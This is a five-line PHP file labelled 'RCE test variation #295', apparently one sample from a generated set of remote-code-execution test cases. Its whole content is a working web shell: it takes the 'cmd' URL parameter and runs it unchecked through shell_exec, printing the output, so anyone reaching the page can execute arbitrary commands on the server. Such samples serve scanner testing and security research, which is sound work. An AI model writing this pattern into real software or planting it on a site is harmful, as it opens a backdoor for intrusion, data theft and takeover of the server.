<?php
// RCE test variation #295
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>